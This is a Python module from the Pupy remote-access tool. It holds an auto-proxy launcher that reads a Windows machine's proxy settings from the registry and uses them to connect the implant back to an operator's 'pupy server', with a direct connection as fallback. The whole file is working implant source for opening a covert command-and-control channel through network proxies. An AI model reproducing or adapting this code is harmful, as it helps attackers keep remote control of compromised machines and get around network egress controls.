# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from ..base_launcher import *
from ..clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient
import sys
import logging
import copy

def parse_win_proxy(val):
	l=[]
	for p in val.split(";"):
		if "=" in p:
			tab=p.split("=",1)
			if tab[0]=="socks":
				tab[0]="SOCKS4"
			l.append((tab[0].upper(),tab[1]))
		else:
			l.append(('HTTP',p))
	return l
def get_proxies():
	#TODO get proxy conf on linux
	if sys.platform=="win32":
		from _winreg import OpenKey, CloseKey, QueryValueEx, HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER, KEY_QUERY_VALUE
		aKey = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings", 0, KEY_QUERY_VALUE)
		try:
			value=QueryValueEx(aKey,"ProxyServer")[0]
			if value:
				for p in parse_win_proxy(value):
					yield p
		except Exception:
			pass
		finally:
			CloseKey(aKey)

		aKey = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings", 0, KEY_QUERY_VALUE)
		try:
			value=QueryValueEx(aKey,"ProxyServer")[0]
			if value:
				for p in parse_win_proxy(value):
					yield p
		except Exception: 
			pass
		finally:
			CloseKey(aKey)


class AutoProxyLauncher(BaseLauncher):
	""" 
		Automatically search a HTTP/SOCKS proxy on the system and use that proxy with the specified TCP transport. 
		Also try without proxy if none of them are available/working
	"""
	def init_argparse(self):
		self.arg_parser = LauncherArgumentParser(prog="simple", description=self.__doc__)
		self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, help='host:port of the pupy server to connect to')
		self.arg_parser.add_argument('--transport', choices=[x for x in network.conf.transports.iterkeys() if not x.endswith("_proxy")], default="tcp_ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
		self.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex for proxy transports: proxy_addr=192.168.0.1 proxy_port=8080 proxy_type=HTTP")
	def parse_args(self, args):
		self.args=self.arg_parser.parse_args(args)
		self.rhost, self.rport=None,None
		tab=self.args.host.rsplit(":",1)
		self.rhost=tab[0]
		if len(tab)==2:
			self.rport=int(tab[1])
		else:
			self.rport=443
		self.set_host("%s:%s"%(self.rhost, self.rport))
	def iterate(self):
		if self.args is None:
			raise LauncherError("parse_args needs to be called before iterate")

		opt_args=utils.parse_transports_args(' '.join(self.args.transport_args))
		for proxy_type,proxy in get_proxies():
			try:
				t=copy.deepcopy(network.conf.transports[self.args.transport])
				client_args=t['client_kwargs']
				transport_args=t['client_transport_kwargs']
				for val in opt_args:
					if val.lower() in t['client_transport_kwargs']:
						transport_args[val.lower()]=opt_args[val]
					else:
						client_args[val.lower()]=opt_args[val]
				if t['client'] is PupyTCPClient:
					t['client']=PupyProxifiedTCPClient
				elif t['client'] is PupySSLClient:
					t['client']=PupyProxifiedSSLClient
				else:
					raise SystemExit("proxyfication for client %s is not implemented"%str(t['client']))
				client_args["proxy_type"]=proxy_type.upper()
				proxy_addr, proxy_port=proxy.split(":",1)
				client_args["proxy_addr"]=proxy_addr
				client_args["proxy_port"]=proxy_port
				logging.info("using client options: %s"%client_args)
				logging.info("using transports options: %s"%transport_args)
				try:
					client=t['client'](**client_args)
				except Exception as e:
					#at this point we quit if we can't instanciate the client
					raise SystemExit(e)
				logging.info("connecting to %s:%s using transport %s and %s proxy %s:%s ..."%(self.rhost, self.rport, self.args.transport, proxy_type, proxy_addr, proxy_port))
				s=client.connect(self.rhost, self.rport)
				stream = t['stream'](s, t['client_transport'], transport_args)
				yield stream
			except StopIteration:
				raise
			except Exception as e:
				logging.error(e)

		try:
			t=network.conf.transports[self.args.transport]
			client_args=t['client_kwargs']
			transport_args=t['client_transport_kwargs']
			for val in opt_args:
				if val.lower() in t['client_kwargs']:
					client_args[val.lower()]=opt_args[val]
				elif val.lower() in t['client_transport_kwargs']:
					transport_args[val.lower()]=opt_args[val]
				else:
					logging.warning("unknown transport argument : %s"%tab[0])
			logging.info("using client options: %s"%client_args)
			logging.info("using transports options: %s"%transport_args)
			try:
				client=t['client'](**client_args)
			except Exception as e:
				#at this point we quit if we can't instanciate the client
				raise SystemExit(e)
			logging.info("connecting to %s:%s using transport %s without any proxy ..."%(self.rhost, self.rport, self.args.transport))
			s=client.connect(self.rhost, self.rport)
			stream = t['stream'](s, t['client_transport'], transport_args)
			yield stream
		except StopIteration:
			raise
		except Exception as e:
			logging.error(e)


